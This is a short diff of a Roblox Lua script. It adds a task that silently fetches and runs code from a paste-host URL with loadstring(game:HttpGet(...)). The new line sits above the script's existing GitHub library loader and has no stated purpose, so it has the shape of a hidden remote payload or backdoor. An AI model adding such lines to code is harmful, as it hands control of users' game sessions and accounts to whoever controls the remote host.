@@ -151,6 +151,9 @@ end)
 
 repeat task.wait() until Solved.value
 --]]
+task.spawn(function()
+	loadstring(game:HttpGet("https://i.e-z.host/p/raw/x8b4gnq9d5"))()
+end)
 leaf = true
 local maker =
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/ASalfinUiBackup-/main/RU9U8JIT9IUJE.lua"))()
